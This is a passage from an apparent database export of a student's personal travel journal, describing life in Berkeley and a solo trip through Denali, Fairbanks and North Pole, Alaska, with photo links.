I would usually go at a really fast pace, like\nunder 4 min kilometer. But some roads are small and I bumped my feet\nonce on Dwight Road. The trail starting from Strawberry Creek Park north\nis good enough, and Cedar Rose Park is a good place to see stars at\nnight. It is also convenient to take bus 51B to go there. Going\nwestward, and there are two big roads, Sacramento and San Pablo Avenue.\nAfter that there is 10th Street, and the numbers start decreasing till\n4th Street.\n\nThere are many beautiful clothing shops on 4th Street, and some fancy\nrestaurants. I went in there, and the waitress were nice, but the\nclothes are too expensive and not suitable for me.\n\nThen there is Aquatic Park after crossing the bridge over the railroad\non University Avenue, and an outlook. There is a hiking trail along the\ncoastline and I hiked both ways. Northward along the coast line is\nAlbany, and southward is Emeryville. Emeryville is cleaner and better\nthan Berkeley, and not hilly.\n\n## South Berkeley\n\nThere isn\\'t much to see on the south side. There is just some houses,\nbookstores, grocery stores.\n\nI remember going down to Downtown Ashby Bart Station, which is quite\nclose. But it takes more effort to go down to Oakland or Emeryville, and\nthere isn\\'t much to see or do anyways, except maybe a park on the way.\nIt is hard to find grocery stores and restrooms on the way.\n\n## East Berkeley\n\nEast side are mountains, and there are a few trails going up, including\nBig C Hike.\n\n## UC Berkeley\n\nThere are about 30 thousand students in one grade in UC Berkeley, which\nis like 15 times USTC. Students are from all around the world.\n\nThe classes are usually crowded at the beginning of the semester, but\nalmost empty at the end of the semester, like only one fifth of the\nstudents are there. This is very strange, since in USTC the class size\nare almost no different. Probably most students prefer remote learning.\n\nIt is tiresome to get around the campus, as there are no west or east\nside of the campus, and walking around in classes takes some effort.\n\nThere are no convenient stores or cafeteria or student dorms in campus,\nand there are only expensive cafes and cafeteria off campus. I remember\neveryone heading to eat back in USTC after classes, but here people go\nin all different directions. There are only 4 cafeterias, and they are\nnot usually full, so I figured that people find there own ways of\neating.\n\nUsually in the morning the campus is mostly empty, but in the afternoon\nit gets really crowded, and just people everywhere. Also, at weekends\nmost libraries are closed, and there are no recitation or discussion,\nwhich is quite different from USTC, where weekends look the same with\nweekdays. There are many clubs on campus, but I wan\\'t in the mood of\napplication in the first semester since I faced finals at the start of\nthe first semester, so I didn\\'t get into any clubs. It is good to be\nalone anyways.\n\nHass Library is always open, even on weekends. But it always gets\nunbearably hot there, even when I took all clothes off. Also once I was\nlocked out after going out to answer a phone call, and my backpack was\nin the library but the door couldn\\'t open somehow. Anyways the door\nopened after 1 hour strangely.\n\n## Berkeley High School\n\nI lived right across Berkeley High school in the first 4 months here,\nand I would usually see groups of people going out to have lunch at\nnoon. Anybody can enter the high school, and it seems that the students\nare having fun. I once went inside and stayed for half a day. Students\ngo around between classes, and they usually walk in groups, chatting as\nthey walk. School usually ends at 2 or 3, and students didn\\'t seem cram\nor having to study 15 hours a day or something. Classes are discussion,\nand students sit in strange positions or walk around, but teachers\ndon\\'t really mind. There are many sport events, including soccer,\nbasketball, volleyball, and I usually spectate on weekends or just\nrandomly encountering some. Ursula Le Guin went to the high school, who\nwrote A Wizard of Earthsea, a book recommended by my English teacher in\nmiddle school.\n\n## Weekends\n\nUnlike Shanghai or Hefei, weekend here is also different, since some\nstores are closed and the school is half shut down.\n\nSan Francisco\n\nSince the Bart is slow, going to San Francisco and back takes quite a\nfew hours. San Francisco is much crowded than Berkeley, and there are\ntall buildings and large shopping malls, and in downtown things are\nclose to each other, just like in People\\'s Square. I went there once to\nwatch a musical. Many people take the Bart in the morning.\n\n## Renting\n\nIt is extremely expensive to rent a house here, and a single bedroom\nwould cost more than 1500 dollars. I figured that it is about 7 times\nmore expensive than Hefei, where I found a studio only 1700 rmb a month,\nbut here the cheapest studio are like 1700 dollars a month.\n\nI first rent a bedroom, and the bedroom was small but everything was\nfurnished. Then the lease ended and they said they will only continue if\nI continued to rent for 1 year, so I went on zillow and rent a studio.\nThe studio was unprepared when I moved in, with no bed, no dishes, no\ntable, no chair. So I had to buy a bed frame and buy mattress myself.\n\nFurthermore, the rent prices are strange, where double or triple rooms\ncost as expensive as 1000 dollars, with the same size shared by 2. So I\nfigured that if 2 people live in a single room it would only be like 800\ndollars, or around 550 dollars for 3 people to live in a room. I don\\'t\nunderstand why they are so strangely curved. Anyways, everything is very\nexpensive."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dec0"}, "title": "Visiting Fairbanks", "date": {"$date": "2023-05-24T09:02:00Z"}, "type": "journal", "access": 1,

and\neverywhere.\n\nSome destinations include Seward and Homer, the seaside towns, Denali,\nthe tallest mountain in North America, Gates of the Arctic, national\npark of untouched nature, Prudhoe Bay and Utqiagvik, to see the Arctic\nOceans.\n\nI learned to be fearless, to have trust in myself, do the challenge\nwithout turning back, to face loneliness bravely\\--solo traveling gave\nme courage. I saw the broadness of nature, the beauty of glacier and\nhuge snowy mountains, melting ice and waterfalls and sliding rocks, the\nblueness of ocean and coastlines and rocky beaches, more than 30 degrees\nnorth in latitude from California, and the wildlife, bears, orcas,\nseals, and many more, that I hadn\\'t seen much before in life. Now in\nthe evening sun everything looked glamorous, and the all the places and\nsceneries I was once amazed at became dwarfed and not that interesting\nanymore. I flew in a helicopter, went on a boat cruise of 110 miles,\nhiked solo on the mountains, went on ATV and Jeep tours, saw the\nkindness of strangers. I learned to be well-prepared, to plan a trip\ncarefully, to get a car in the future to be ready for the roads and\nmountains. There are many first-times for me on this trip.\n\nOne trip is hardly enough, and I quickly fell in love with Alaska,\none-sixth the size of Europe. After this trip I will return one day, and\nperhaps even choose to live here.\n\nFuture places to go: Prudhoe Bay, Gates of the Arctic, Utqiagvik,\nJuneau, Ketchikan, Wasilla, Alyeska, Talkeetna, Harding Iceberg Trail,\nLost Lake\n\nI tried to book the cheapest hotels, but they are still expensive. The\nreasons are because I travel solo while most hotel rooms are for 2\npeople and I do not have a car, so I cannot go very far and only have\nlimited selections, and couldn\\'t sleep in a car. The most expensive one\nis airbnb in Anchorage, which was actually designed for more than 1\nperson but since I was staying only 1 night, with the cleaning fee it\nbecame expensive.\n\n## 521\n\nToday is 521.\n\nI am just leaving Denali, and going to fairbanks. My trip is almost\ncoming to and end with the final destination. I am on the train, and\nfeeling quite sleepy.\n\nToday I first went on a Jeep tour. The Jeep tour was to pick me up at\nPrincess Hotel and 7 am. It was freaking early and so hard to get up and\nI got up at like 6:59 and then hurried to finish packing my things. I\nwent to the hotel lobby and I could hear the tour guide calling my name,\nand I didn\\'t even check out or drop luggage, which I had planned to do,\nbefore leaving and going on a Jeep tour. Fortunately, though, te\ncheckout went successful.\n\nThe Jeep tour is extremely expensive, like 184 dollars. Everybody got to\ndrive a Jeep of their own, and those couples usually sit together,\nexcept for me, as I had to sit in the tour guide Myriam\\'s car. Then we\ngot off to the park road.\n\nThen the tour guide explained how the rivers were all formed by\nglaciers, and salmons will die in those rivers so inland, since the\nrivers are rich with silt, which comes from glaciers, and we can judge\nhow the river flows from how brown the color is. The Park Highway went\nlike along Nenana River, the one just down Princess Hotel.\n\nThen someone saw a moose and we all slowed down, and I managed to get my\nfirst picture of a moose here. Then we went to see some caribou, which\nis like reindeers. I saw those caribou from a binocular provided in the\nJeeps, and there were 3 of them, eating grass. We drove on Denali\nHighway, where it turned out to be a dirt road, and to camp settlement\nand had a stop there, it seems as an entry to the mountains. Then we had\nsnacks provided by the tours. It was a spot to overlook spot where I\ncould see those snowy mountains, and the tour guide explained Denali is\nlike 18000 ft from base camp to the top, very impressive, still growing\nat .5 mm everywhere becuase of those plates clashing together.\n\nOn the way back we passed some RVs, a crazy motorbiker, ATVs, and some\nnormal cars. Then I got very sleepy and slept for half an hour. When I\nwoke up there was 2 caribous in sight. Then we went back to the highway.\nIt just seemed like a normal drive, and I ended up paying so much.\n\nThen I went back to the hotel and stored my luggage, then headed to the\nhorseshoe lake trail. The trail was a piece of cake for me and I ran\nfirst half. Then I saw a beaver\\'s dam, and I crossed it, getting my\nshoes wet. It isn\\'t hard to cross it, though, the trees and leaves are\nall loose. Then there was a rock cliff like in the side of the lake, and\nI attemped it twice. However, everything was loose and I couldn\\'t even\nget past like 30 feet before feeling too dangerous to go on. Anyways, I\nam like 18 years old and don\\'t want to risk losing my life. Then I saw\nsome road in the tundras and attemped it, and it seems smooth at first.\nHowever, there are too many dead trees falling down on the way and those\nbranches got in my face. I tried very hard to reach the other side of\nthe park road, but it was a steep climb and there was just too much tree\nbranches, so I ended up quitting it anyways. The way down is no easier\nthan the way up, and I crawled on all fours and tried to slide down the\ntundra. But there are so many dead trees and branches and mosquitos, and\nthey always flew around me. It was annoying but I managed to go down\nsafely.\n\nThen I ate some food in the restaurant Morina Grill and then went back\nto pick up my luggage. People here kind of work in all different states,\nand many come here only for the summer, which is cool. I thought about\nfinding jobs every year in different places and it seems tough but fun\nat the same time. Then I boarded the train to Fairbanks. Denali is the\nhighest mountain in North America, and I haven\\'t explored much of this\nplace yet before leaving it. I hadn\\'t even gone on the denali bus tour\nor the savage river shuttle. But anyways things went fine. I slept half\nof the journey.\n\nI found that the land became greener and grenner as I was going\nnorth-summer was coming there first. In Seward after 500 ft or so\neverything was covered with snow, and in Denali there was only little\nsnow on top of the mountain, then as we are going to Fairbanks on this\ntrain everything seemed so green, that it didn\\'t look like 67 degree\nnorth latitude at all. Trees are growing just everywhere, and no trace\nof snow could be seen by eyes. I thought that on the train from Shanghai\nto Hefei it was more bare than this. Then I arrived and called the hotel\nand they came pick me up.\n\nThere was only me staying in Golden North Inn and the man picking me up\nwas a fourth year student in University of Alaska Fairbanks, who is\nworking in the hotel. He is kind of dressed in woman\\'s clothes and is\nvery nice. He talked about how he had only C grades and had attempted\ncomputer but failed, and I thought I was fortunate not having to work\nwhile studying. After settling into the hotel I grabbed a map and went\nright out to hike. I planned to go downtown and went along Cheny River.\nI saw a group of people who thought I was Japanese, and a woman acting\nvery strange and talking to me in words I can\\'t understand. Anyways, I\nleft and went for downtown.\n\nIt was pretty late at about 10 pm at night, and it is quite empty. I\nkept along Cheny River. I went to Pioneer Park, which seems like a\nchildren\\'s playground, and there are some women doing bike flips, which\nseems very interesting. Then I went to Growden Park, and there are a\ngroup of people, mostly kids and teenagers, playing volleyball. Some of\nthem are half naked and barefoot they were having so much fun that I\nwished I could join. There are also some other people skateboarding\nthere in the park. It was beautiful there at night. In Denali and Seward\nmost people are tourists hiking around while in Fairbanks they seem to\nbe living normal lives. Also, the more north I traveled the hotter it\ngets. In early May, it was like 5-10 C in Seward, in Anchorage it was\nlike 10-15 C, while in Fairbanks it was like 15-20 C. Now as I look\naround the trees and mountains are deep green, and there are no signs of\nArctic weather or coldness, just spring and life everywhere.\n\nThere are few people on the streets in the evening and it did get\nlonely, then I thought like hiking with another person. But then again,\nlike 2 people aren\\'t necessarily safer, if a wolf or bear comes out and\nattack no one can escape, and I think it is just as safe hiking alone as\n2 people because I tend to be more careful when I am alone. Anyways, I\nfigured it was mostly mental support, and maybe by traveling in groups\nmakes the trip sounds more reasonable, instead of like mindlessly\nwandering, which was what I had done. I gotten so much good photos that\nI had a hard time deleting the mediocre ones.\n\nThen I went to Kiwanis Park, which is much more deserted. I walked\naround then quickly went out of the park to downtown. There is an\nelementary school and I could hear people playing in the school, and it\nwas like 10:30 pm. I thought I had gone to bed earlier than this in\nelementary school before becoming half a night owl now. Anyways, it was\na hard walk and my legs are beginning to feel sore. I could see the\nmountains and a red sun just setting down, and it looked so beautiful.\nDowntown Fairbanks looked very worn down, and there are merely a few\nbuildings, and few people. It was actually a little bit creepy, and\nthose people doesn\\'t seem to look very decent. There was just old\nhouses on either side of the street. I walked to City Hall, and there\nwasn\\'t much to see. Anyways, it was like 11 pm, and I was getting\ntired, and the wind was becoming cold. I walked around a little bit\nmore, and up to Cheny River again. In the red setting sun the bridge was\nso beautiful, and I took some pictures, and there was a statue about\nWW2, and there was a polaris sculpture. I saw some people sitting\noutside, and they are probably homeless, so I wanted to go back as soon\nas possible, and I called a Lyft, and it came after 20 mintues. I then\nwent back to the hotel.\n\nFairbanks is much smaller than Anchorage in both population and size. It\nis very beautiful, and a quite populated city as north as I could get.\nIn less than like 40 hours I would be in Berkeley again, and my\nluxurious trip is coming to an end. I totally enjoy this trip.\n\n\\\nHorseshoe Lake\\\n![](https://cdn.jimchen.me/w7cGP3uwIl_4kspcqBH1weDncPaBOxAVo7MF7uA_y3VCDdIWTn-efKzuYT_8uU9jFFH0rRe-_cdGKtG6d-6iRj2heftIlhNr1UrxdYJvIc1w239lEYmtUPikSemoZbz8xJctmFXlLpRD92SDGAMoHEs=s800)\\\n\\\nGrowden Park\\\n![](https://cdn.jimchen.me/2jxviBLDUEnT5BW_u4-PhUsXX0-AcA7EPEC3G3gSo4WsqQTAutIbjrJ-MC2GELuOoTMV_lN9F25o4lnyA3mzs9vgOYb4NxmEi5CkpD_nCEebWvi20FiwGG5JJZEH2Jkmb-hTJw5lXojnhlWCu2bcHCU=s800)\\\n\\\nChena River\\\n![](https://cdn.jimchen.me/poDcIoo4NKU3L5mtotLq-CNkwwZIDlcyAXSiwvBz8KXq5NFUe4Gs1_X1go-Xjo6Tqu6hhPgm2ZQPDG6uTdFXSr6YgFDzFvY8fuE_PgPTLbFUi9b72WjdgF_99RdMyizSKMgcccWb7ZNJN5rRgqkius4=s800)\\\n\\\nMidnight\\\n![](https://cdn.jimchen.me/VrwrsStMMdRBBE6qsOKzM7I1ZHT-S2Kv4dPgLQrcBXGolQftQOS56oRturui-pMsRmrsQQmdKKp8iNZr2_b_oa_cZ6TuMyWtONtSXA9kMkIuIfhL3keGDtYvVzO_cuasFOOLh4p_jNtsxDy00JT484k=s800)\\\n\n## 522 \n\nToday is 522 and I am leaving Alaska.\n\nI slept all morning and got up and ate breakfast at the hotel. Then I\ntook a lyft taxi to North Pole, and there was a big statue of Santa\nClaus, and the driver even helped shoot a photo of me with Santa Claus.\n\nThen I walked around North Pole, and it seemed a small and old town. I\ncould hear a few dogs barking so I was scared. I walked around and there\nwere some parks, but the roads aren\\'t well constructed. Then I went to\nthe North Pole elementary school, and I didn\\'t even realize I went into\na school. I saw many kids, while the whole population of North Pole is\nlike less than 3000, so I figured that there are less than 50 kids in\none grade. Then I looked it up in the map and there was the elementary\nschool. Children are climbing up and down and swinging, and seemed to\nhave fun, which made me want to have fun with them, but I walked away.\nNo one stopped me from entering the school though.\n\nThen I went to a shopping mart, and rested a while, and walked to a bus\nstop, and took the bus back to Fairbanks, then took a Lyft to the hotel,\nthen took the shuttle to the airport. Then I went into the airport and\nmy trip ended.\n\n\\\nSanta Claus Statue\\\n![](https://cdn.jimchen.me/7A_pN5mExlid8Tz3X5r80xCzJThDY9Z3ezDVnRaFj9NNc8CQYDRjbraglvKI8BZWDcpHz5AH6lGGfLr79xXK8eSkm1PdM8yxsE0puXNOyKJycQ7h78k2_NQO3cHFHCKmTWOJg2O6fM8wTP6d7Lxab6Y=s800){style=\"width:40.0%\"}\\\n\\\nSanta Claus Store\\\n![](https://cdn.jimchen.me/LUnJF-ral0Vr3bE_Nw3SOh-QAzQCx63WkVsvytCZaFTKOl0ZkcYFJBDK04M9GWAE2yoT75oJuMmvLd5LeK6xpIzMdFj9pDSKPFu2LKBNOWKpZ8EFaqD1dqwu1roSDkB2H7D232jYIZ5-U6j9rlcfWH0=s800){style=\"width:40.0%\"}\\"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dec1"}, "title": "Visiting Denali", "date": {"$date": "2023-05-21T22:23:00Z"}, "type": "journal", "access": 1, "body": "## 519 \n\nToday is 519.\n\nI stayed up very late because I was too tired I didn\\'t feel like\nsleeping at night. I watched a few YouTube videso and organized the\nphotos I took on the previous days. But I had to get up super early,\nlike 7 am in the morning, to catch the train. I did see some homeless\nacross the street, where the house owner Rob wrote on a paper saying\n\\\"the Alaskan government released 300 homeless on the streets\\\", and how\nit had hurt his business.\n\nThe cottage was so comfortable and nice that I didn\\'t want to leave. It\nwas so big, like 2 times the normal size, and I really really loved it.\nI felt like I could stay there for years. It was kind of tearful\ngoodbye, and I left Anchorage while feeling so sleepy. Then I got on the\ntrain to Denali.\n\nThe train is very slow, but there are few people on board. Some people\naround me talked, and there is a solo traveler who would be spending 8\nweeks here and 2 nights in Talkeetna, and there was a mid-aged couple\nwho is spending 7 weeks here and then going to Vancover and Seattle. I\nkind of liked that idea but I got many things to do. The tour guide\ntalked about the scenic places all along, and also said that they hired\nhigh school seniors on a 11 week program to be tour guides. I wondered\nhow much they can earn. An old man said to a young worker on the train\nthat he would gladly take the job had he been 50 years younger because\nthe view is so fantastic. We got to Nancy Lake and tour guide said how\npeople would choose to retire here. And most towns on the way doesn\\'t\neven have electricity. Anyways, I ended up sleeping all the way to\nnearly Talkeetna, and missed much of the views, but I was in a better\nform.\n\nThe train is like 8 hours, but actually it only takes 4 hours to go by\ncar. When we arrived at Talkeetna two Taiwanese, brother and sister,\nboth kind of old, got on the train, and they were speaking in mandarin\nso I went over and said hi, and we chatted in Chinese. They had no cars\nand they also took the flight yesterday, and did a glacier landing. I\ntalked about how I came from Shanghai, and I went from Seward to here,\nto which they replied, \\\"intersting\\\". They were going to Seward after\nDenali. The woman was always taking photos of the beautiful view\noutside, and exclaiming, \\\"beautiful, beautiful\\\", in mandarin with a\nstrong taiwan accent. They were also going to take the boat cruise, and\nwanted to walk in downtown, but couldn\\'t go on any hikes because they\nare not strong enough. Then they asked what I was studying and stuff,\nand how computer science degree is good. Then we passed a beautiful\nbridge about 900 feet long and the tree opened, and there was a big\ngorge.\n\nThen I took a picture of them and they took a picture of me, and in the\npart of the train there was only us 3 people. The train slowed down at\nsome points to very spectacular views of the whole mountain, but most\ntimes there are so many trees. We even got close to the tree line, where\noutside everywhere higher than the train there was just snow and rock\nand bushes, no trees anymore. We passed some interesting lakes. Then I\nfell asleep again.\n\nAnyways we arrived at Denali at 4 pm, and I got in the shuttle to the\nhotel, and ate at a subway. I went across the street to book an ATV tour\nand a Jeep tour, then I ate at a subway. Then I got a stomachache and\nfelt bad for 3 hours. Then the grade for computer security was released,\nand it turns out wasn\\'t good, but wasn\\'t as bad as I expected. I\nwondered how I managed to get above average scores on those hard classes\neven after doing almost nothing for a whole semester, and how I\nconstantly struggled with my coursework even after studying really hard.\nSometimes it seems like working hard at all from the perspective of\ngrades or results, that everything is just the way it is. If I feel like\ndoing something I accomplish it, no matter if I actually put in effort\nor not, while if I don\\'t I just can\\'t, and no matter how hard I worked\nthe result doesn\\'t change at all. Only thing I can do is choose what to\ndo, for example, choose which course to study, choose between going on a\ntrip or studying or watching YouTube. Then I thought that I should have\nput all my time into running and climbing mountains and going out\nsightseeing, and how I couldn\\'t accept the fact if I am doing that\nright now but maybe I could be doing that after completing the degrees\nand immigrating to Alaska or Switzerland or whatever. However, I looked\nup University of Alaska Anchorage\\'s computer science and it didn\\'t\nappear in csrankings, and turned out to be like number 249, which is\nlike pretty bad. That was so unfortunate for me.\n\nThen I decided to call it a day since it was pretty late, and I am tired\nand can\\'t do anything else. Denali looked like a tourism destination\nwhile Seward is like normal town, where there are actually people living\nthere. Everywhere in Denali there is just tours, hotels, restaurants,\netc.\n\n### Photos\n\n\\\nAnchorage-\\>Denali\\\n![](https://cdn.jimchen.me/ofS4I1EU3bxY0sLG0KovE-YllGY8i876Q2p-ae6OCgpTCG86m_GI7LZJGpi1Tcm3On47phQ79L77e_uHx2T7dlFN-N3zZo7phWqjSkgQLWTQy-EUTk89MQOIFsZLBgygSYwQgqcgoFaKDsuMpESXovg=s800)\\\n\\\nGorge\\\n![](https://cdn.jimchen.me/wRc999efr8exGYb9wZFsx9umI8XwqYsLjwqYN-YFMjnqC1BjElpDw8S5LcqgNmWQShv_JHuQv8nWcExO2i0W2Wn5vPVU1a0cv_5XMyQLekyusbE53kbpfiVABl6bm_5sAbHBdS7q36d_AS84T6_BHK0=s800)\\\n\\\nMe on the Train\\\n![](https://cdn.jimchen.me/ZffwCrXFZagwjO-YtBmFL2cucZDUHcyI8tjus-VaI8o-VWweoVJhvPUbMpkP8i5wYJtMALUw3FJ2XFmOZy0fxdopT40uBg-ciD_YEua6ixoxqBqnmozBLeDpZJeoAmR_eU7s5nknius4hO6FOu4GTXA=s800)\\\n\\\nMirror Lake\\\n![](https://cdn.jimchen.me/oS36mJ-PFLXsz8Nl5uaYxy98cOv_qQWJhE4ezwg-zaMmW0XoTo41yQDWEfKsTsbl_6opkgcdaxmMizo_GUSZd1EK7QrGGgy8FjN4vBZC8frQIUnR9l5gDmg-seRGBz8k7lpb-HsNv2yaRpmquuzcBXU=s800)\\\n\n## 520\n\nToday is 520, and it is already a week since I arrived in Alaska, how\ntime flies!\n\nI slept all morning. Then I went for a hike, but I didn\\'t know where to\nhike. My stomach hurt yesterday so I didn\\'t have lunch and breakfast,\nand I went hiking without like anyfood, but it felt fine anyways. I went\non the hotel shuttle bus to Denali visitor center, and there was 4 old\npeople on it with me. One of them said he is 80 years old, and another\nsaid his grandson is 19 years old, and how he had moved to Anchorage in\nlike 1970s, around the time my parents were born. Anyways, we chatted a\nbit, and they were from California and Anchorage. Then I thought about\nhow they would be like a young boy like me 50 years ago. Then I thought\nabout how precious time is, that I should be spending my time doing the\nthing that is truly worth it, then one flick of a second later I would\nbe old as hell, and not able to walk anymore or whatever, and my stay in\nthis world is short, so I think I should do the thing I want now that I\nam in my prime and not leave things to do when I am old. Then I went on\nMount Healy Trail. The trail is much easier than the trails in Seward,\nand the road is clear and not steep. There is 1700 ft elevation gain. I\nalmost run up the trails, and it got so hot that I was sweating, even in\nshort sleeves. There are no snow on the ground, and I thought how much\neasier it is. There are tens of people going up the trail, and we all\nwaved hi as we went past each other. Then the road became steeper, and\nthe view opened up, and I could see mountains, but there are snows only\non top. Denali melts faster than Seward, where above like 500 ft\neverything was covered with snow. The mud is wet everywhere, and I\nreckoned it is the melting snow, but I don\\'t see any snow until to the\nvery top. The wind is very strong, and it got quite dangerous after the\nend of mount healy trail. I was also almost out of water so I turned\nback. I felt quite energetic at the top of the mountain, then run down\nthe mountain. There are two women who was also running, and they passed\nme as they were running even faster. Then I went back and got water and\nwent on Rock Creek Trail.\n\nHowever, Rock Creek Trail is not worth it, just like a walk in the park.\nI walked very quickly, and went to Denali Park headquarters. But there\nare few people, so I turned back. The trail turned out not to be short,\nlike 4 miles round trip, and it took me quite a lot of time, like 1.5\nhours. I decide to go back to hotel since it became late, and my legs\nare a little sore. I think if I had woken up earlier I could\\'ve hiked\nmore. Then I thought that the mountains in Hefei are a piece of cake,\nand how well constructed the roads were. I could go up and down 3 times\neasily now. I figured it would feel strange to sleep before nighttime\nback in California.\n\nThen I went on an ATV tour. The bus driver picked me up at Princess\nHotel, and all the way to an ATV station. The driver said he was from\nColorado, and went to all states except Hawaii, which he hopes to make\nit in his 50th birthday, and that it was his 2nd year in Alaska.\nAnyways, he is very humorous and interesting. I thought what a life that\nwould be. The bus driver also said that the place to drive ATV is not in\nDenali National Park, since it is illeagal, instead, it is like 10\nsquare mile range separated from the park. Then we got off the bus.\n\nThe ATV tour guides first introduced and talked about the rules, that we\nshouldn\\'t stop or shoot photos or do those front flips, or we will be\nremoved. The tour guides were called Rico and Stefan, They talked about\nhow we need to follow the next car for a reasonable distance, so that we\ncan see headlights and not get too close. It was my first time driving\nanything, and I was like the only person without driver\\'s license. I\nsat inside the ATV, and the tour guide said we were only supposed to\npress break and acceleration and the wheel. Then we started to go up the\nmountain, and I felt very nervous indeed. Anyways, everything went on\nsmoothly, and I was able to drive easily. The tour then slowed down and\ntold me to stick on the same side as him as we would be passing other\ntours on the other side, and I followed.\n\nThe road was very bumpy, and the ATV seemed to go over anything, like\nrocks, pebbles, and muds with melted snow. I tried very hard to balance,\nbut since the roads were full of ups and downs, the ATV went tumbling\nall the time, but it was still pretty smooth. The wheels doesn\\'t turn\nreally well, so sometimes when the tour in the front made a sharp turn I\nhad to go through some bushes to catch up. We went at a reasonable pace,\nfast enough but also very safe from any collisions.\n\nThen we came to a scenic view and we stopped, then Stefan talked a\nlittle about the mountains and lakes around. Stefan said it was like 10\nhour hike up Mount Healy, and that the small town under there had 800\npeople in winter and 5000 in summer, since winter is -50 degrees. I was\nimpressed how fast the ATV drive was, and in just minutes we drove up so\nhigh up. I would be so much more tired if I hike up here, though.\n\nThen we went to a shallow river with a big sandcastle, and we stopped\nfor like 15 minutes. Rico and Stefan joked that they had come at 2 am to\nbuild it together. Then they explained that it was formed by erosion,\nand there are sands sliding down as we were talking. The lake was called\ndry creek, and they also explained that the river can travel anywhere,\nand they were formed by erosion of rocks, and how on every different\ntours the river would seem different, and how a landslide just came a\nfew years ago and blocked the river, filling everything with dead trees.\nI asked if I could possibly climb the sand-rock thing, and they said it\nwas too dangerous. Then they also picked up a few pebbles, and explained\nhow there might be jewels or gold in those rocks, and showed us how to\nmake clay as ancient people, using a redish rock to carve on another. I\ntouched the water and it was icy cold. The tour guides said we could\ndrive over the river but the other tourists were very scared and thought\nit dangerous. In the middle evening sun everything looked so glamorous.\n\nRico and Stefan they came from Miami, and they said Miami was perfect in\nwinter. Rico said that there are a really good highway in San Francisco\nto drive, and there was just ocean, mountain, and you. Then he said he\nhad been to everything in the lower 48 states, so he ended up here in\nAlaska, which is the only place he had not yet explored. I said I wanted\nto go to Miami, and I thought that I was already planning my next trip\nto Miami, Palm Beach, Fort Lauderdale, and Key West. The two other\nvisitors said they were impressed how I could drive like that without a\nlicense. The guides also talked about fishing, and how they would catch\n10 big fish in an hour and get enough fish for a whole year down in the\nOtto Lake. Anyways I could feel myself much more adventurous and tough\nwithout my parents around, and I felt young and energetic. I said the\nhike in Seward is much harder than the hike in Mount Healy, and the\nguide said my shoes aren\\'t right for hiking, and they had those long\nboots for fisherman, which goes over mud while I was wearing Nike\nPegasus, which is like distance running shoes, but they seemed all right\nfor hiking without snow, though.\n\nBy the end of the day I was driving like it is something I do every day\nin my life, and it felt so good coming down the dusty trail. The ATV was\nsliding but it is very safe. The guides said those ATVs can go across\nanything, like bushes, and they can go all the way to the top of the\nmountain. I saw those big horses on the way back, and the two horse in\nthe front was leading a carriage filled with people. The tour guide\nwaved and the horses and carriages moved to one side, allowing me to\ndrive past on the other side.\n\nThe tour guides are so nice that I ended up giving all my 5 dollar\nchange to them. But then I thought that they were only nice because I\npaid so much, and strangers are usually casual. Anyways, I am using my\nparent\\'s money, so I am spending a lot, so they are nice to me because\nthey want good reviews so they can get more money. I would feel much\nbetter if I earned all the money myself. Then I checked up the price of\nRV, and they were very expensive, like the Minnie Winnie I hitchhiked on\nactally cost like 250 dollars one night, which is more expensive than a\nhotel room, but they were for a group. Then I thought maybe next time I\nwould be traveling with wife or girlfriend or something, but I don\\'t\nhave and girls may not be hiking with me for 10 hours everyday and they\nare always very hard to understand, so it would be much harder for me so\nI would probably be traveling solo anyways. I thought about driving\naround the Alaska, going to Homer, Seward, Alyeska, Talkeetna, Healy,\nPrudhoe Bay in my RV, and it sounds so cool and I could do so many hikes\nevery day and sleep and get up whenever I want. Anyways, I don\\'t think\nI can do that. Then I thought about staying a few more days, as I don\\'t\nwant to leave, but this trip is luxurious enough, and few people could\nafford 9 days in Alaska anyways. I thought about living here after\ngetting appropriate degrees or something and it looked pretty good if I\nhad a stable income. From every perspective Alaska is much better than\nBerkeley, while Shanghai and Hefei and just too crowded, and although I\ndon\\'t think that is too bad, I kind of lived there for almost 20 years\nand want to try something different for couple of years maybe.\n\nAnyways, I didn\\'t realize that it was 930, and the 2.5 hours passed so\nfast. On the drive back the driver got on the left shoulder of the\nhighway, which is illegal in Alaska, hoping to spot a wild anyway, but\nmoose didn\\'t came out. Then we spotted two Dall Sheep on the mountain.\nThen we got back to the hotel.\n\nThen I went on a gift shop and bought 2 t-shirts, and the staff was\nreally friendly, and then I got really hungry, probably becuase I\nhadn\\'t eaten lunch and had a small dinner, so I got like few snacks for\nme. Denali is merely a tourist attraction, but it is very beautiful\nindeed.\n\n### Photos\n\n\\\nMount Healy Trail\\\n![](https://cdn.jimchen.me/iAP3UDHlkL5-xZ_acegfJIKYejrJu5zhGqevFWbEoNxOuaamhyZDO73-BvoGwE4whS6bbsZML80WPvVYHqYd5xPNBw2GhCi15Q0Ikc-C6uoeXUsBEKod3MnovHisbEZ2yZrlpC4PFvvSoKDRtQGQ7YE=s800)\\\n\\\nRock Creek Trail\\\n![](https://cdn.jimchen.me/ceCUweubRB14dzQNq1XHcacIQA0H6UCUqRTfaBAx_8Dt82dF-dhxJmowqc3PZs91RONB9l-DuyyLgqjhC2FvWwMKZMdoX0TXMgkmtlPm9Mv6fsrIjDG-IRp1_nNo6reHquTjB3jXHABQx7eNWMHbO7U=s800)\\\n\\\nATV\\\n![](https://cdn.jimchen.me/AASebsDB2QiXgtoEzyzxGGX-BxKs1x4z57pWSbqB0jjDb7w-vR2wq8NcXck7w3a6-XR5TZwBKNfd2uk_ooF3VeMoQEYH4TJhkATSUvG2cg9VncI7jNm89IrG8VJhv_OD5tj2X0R6GacaekeSHnMPgtc=s800)\\\n\\\nDry Creek\\\n![](https://cdn.jimchen.me/HszviEs9k6Zg-idO51b2XcbJWk2gQ4wx_1bzn-x4rcbZUO8uXYkq_dL5ssc6j_vdD2zx50tiTnOOQuWjTV6QIrvxGEH-v5yUVAp5Qd78TLZ8beODqYFVPLHbqgXYPtPyR1Huy0GTWKbmRisK8UwhzEc=s800)\\"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dec2"}, "title": "Visiting Seward", "date": {"$date": "2023-05-19T21:23:00Z"}, "type": "journal", "access": 1, "body": "## 516\n\n\nToday is 516 and I am departing from Anchorage to Seward. I got up super\nearly at 5 am to catch up the train at 6:45 am. The lyft drive was so\nfast and I got to the station at 526 am more than 1 hour earlier. Early\nmorning is so struggling for me, but I feel pretty well today.\n\nI walked around in downtown and the sun was just rising over the\nmountains, it was so beautiful. But there are some homeless people\nsleeping on the ground so I tried to avoid them.\n\nHowever, due to an avalanche the train was cancelled, and instead 